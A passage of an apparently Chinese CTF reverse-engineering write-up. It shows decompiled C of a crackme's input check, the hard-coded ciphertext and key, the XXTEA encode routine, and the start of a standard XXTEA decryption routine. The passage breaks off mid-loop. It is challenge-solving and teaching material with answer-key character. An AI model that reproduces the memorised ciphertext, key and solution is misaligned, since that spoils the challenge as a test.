<span class="line" data-line="4"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ( </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">((_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)p_v1 </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> i_0) </span><span style="color:#F97583">!=</span><span style="color:#FFAB70"> v2</span><span style="color:#E1E4E8">[i_0] )</span></span>
<span class="line" data-line="5"><span style="color:#F97583">        goto</span><span style="color:#E1E4E8"> LABEL_2;</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="7"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Your input is the right answer!"</span><span style="color:#E1E4E8">);</span></span></code></pre>
<p>通过开头这一段我们能够拿到 <code>p_v1</code> 数组即加密后的 <code>v2</code> ，用于加密的 <code>k</code> 和长度 <code>n</code></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line" data-line="1"><span style="color:#E1E4E8">  n1 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 18</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">  v11 </span><span style="color:#F97583">=</span><span style="color:#FDAEB7;font-style:italic"> 17i64</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">  v3 </span><span style="color:#F97583">=</span><span style="color:#B392F0"> alloca</span><span style="color:#E1E4E8">(</span><span style="color:#FDAEB7;font-style:italic">80i64</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">  p_v1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)(</span><span style="color:#79B8FF">4</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> (((</span><span style="color:#F97583">unsigned</span><span style="color:#E1E4E8"> __int64)v2 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">));</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> p_v1;</span></span>
<span class="line" data-line="6"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)p_v1 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 646664799</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="8"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1563984516</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="10"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 5403868</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="12"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">851615406</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="14"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1577982033</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="16"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1112569621</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="18"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">2038538024</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="20"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 89732896</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="22"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 856644365</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="24"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1143066723</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="26"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1826125009</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="28"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 947398586</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="30"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">204891967</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="32"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1909151093</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="34"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 632925486</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="36"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 381866701</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">[]</span><span style="color:#E1E4E8">)((</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="38"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">(_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">976384688</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="39"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">((_DWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)v4 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1681924957</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="40"><span style="color:#FFAB70">  k</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 73</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="41"><span style="color:#FFAB70">  k</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 83</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="42"><span style="color:#FFAB70">  k</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 67</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="43"><span style="color:#FFAB70">  k</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 67</span><span style="color:#E1E4E8">;</span></span></code></pre>
<p>进入加密函数 <code>encode</code> 可以看出来是一个 <code>XXTEA加密</code> 或者通过 <code>findcrypt</code> 插件也可以看出来</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line" data-line="1"><span style="color:#F97583">void</span><span style="color:#E1E4E8"> __cdecl </span><span style="color:#B392F0">encode</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#F97583"> *</span><span style="color:#FFAB70">v</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> n</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> int</span><span style="color:#F97583"> *</span><span style="color:#FFAB70">key</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="3"><span style="color:#F97583">  int</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v4;</span><span style="color:#6A737D"> // rax</span></span>
<span class="line" data-line="4"><span style="color:#F97583">  int</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v5;</span><span style="color:#6A737D"> // rax</span></span>
<span class="line" data-line="5"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> y;</span><span style="color:#6A737D"> // [rsp+8h] [rbp-18h]</span></span>
<span class="line" data-line="6"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> e;</span><span style="color:#6A737D"> // [rsp+Ch] [rbp-14h]</span></span>
<span class="line" data-line="7"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> rounds;</span><span style="color:#6A737D"> // [rsp+10h] [rbp-10h]</span></span>
<span class="line" data-line="8"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> p;</span><span style="color:#6A737D"> // [rsp+14h] [rbp-Ch]</span></span>
<span class="line" data-line="9"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> sum;</span><span style="color:#6A737D"> // [rsp+18h] [rbp-8h]</span></span>
<span class="line" data-line="10"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> z;</span><span style="color:#6A737D"> // [rsp+1Ch] [rbp-4h]</span></span>
<span class="line" data-line="11"></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">  rounds </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 52</span><span style="color:#F97583"> /</span><span style="color:#E1E4E8"> n </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 6</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">  sum </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="14"><span style="color:#F97583">  for</span><span style="color:#E1E4E8"> ( z </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[n </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">]; rounds</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">; z </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v5 )</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">  {</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">    sum </span><span style="color:#F97583">-=</span><span style="color:#79B8FF"> 1640531527</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">    e </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (sum </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="18"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> ( p </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; p </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> n </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">++</span><span style="color:#E1E4E8">p )</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">    {</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">      y </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[p </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">];</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">      v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> &#x26;</span><span style="color:#FFAB70">v</span><span style="color:#E1E4E8">[p];</span></span>
<span class="line" data-line="22"><span style="color:#F97583">      *</span><span style="color:#E1E4E8">v4 </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> ((y </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> sum) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (z </span><span style="color:#F97583">^</span><span style="color:#FFAB70"> key</span><span style="color:#E1E4E8">[e </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> p </span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">])) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> (((</span><span style="color:#79B8FF">4</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> y) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> (z </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 5</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> ((y </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">16</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> z)));</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">      z </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v4;</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">    v5 </span><span style="color:#F97583">=</span><span style="color:#F97583"> &#x26;</span><span style="color:#FFAB70">v</span><span style="color:#E1E4E8">[n </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">];</span></span>
<span class="line" data-line="26"><span style="color:#F97583">    *</span><span style="color:#E1E4E8">v5 </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> ((</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">v </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> sum) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (z </span><span style="color:#F97583">^</span><span style="color:#FFAB70"> key</span><span style="color:#E1E4E8">[e </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> p </span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">])) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> (((</span><span style="color:#79B8FF">4</span><span style="color:#F97583"> *</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> (z </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 5</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> ((</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">v </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">16</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> z)));</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">  }</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>找一个解密算法</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line" data-line="1"><span style="color:#F97583">#define</span><span style="color:#B392F0"> DELTA</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">9e3779b9</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="2"><span style="color:#F97583">#define</span><span style="color:#B392F0"> MX</span><span style="color:#E1E4E8"> (((z</span><span style="color:#F97583">>></span><span style="color:#79B8FF">5</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">y</span><span style="color:#F97583">&#x3C;&#x3C;</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (y</span><span style="color:#F97583">>></span><span style="color:#79B8FF">3</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">z</span><span style="color:#F97583">&#x3C;&#x3C;</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> ((sum</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">y) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">key</span><span style="color:#E1E4E8">[(p</span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">e] </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> z)))  </span></span>
<span class="line" data-line="3"></span>
<span class="line" data-line="4"><span style="color:#F97583">void</span><span style="color:#B392F0"> btea</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int32_t</span><span style="color:#F97583"> *</span><span style="color:#FFAB70">v</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> n</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int32_t</span><span style="color:#F97583"> const</span><span style="color:#FFAB70"> key</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">])  </span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">{  </span></span>
<span class="line" data-line="6"><span style="color:#F97583">	int32_t</span><span style="color:#E1E4E8"> y, z, sum;  </span></span>
<span class="line" data-line="7"><span style="color:#F97583">	signed</span><span style="color:#E1E4E8"> p, rounds, e;  </span></span>
<span class="line" data-line="8"><span style="color:#F97583">	if</span><span style="color:#E1E4E8"> (n </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">            /* Coding Part */</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">	{  </span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">		rounds </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 6</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 52</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">n;  </span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">		sum </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">		z </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="13"><span style="color:#F97583">		do</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">		{  </span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">			sum </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> DELTA;  </span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">			e </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (sum </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="17"><span style="color:#F97583">			for</span><span style="color:#E1E4E8"> (p</span><span style="color:#F97583">=</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">)  </span></span>
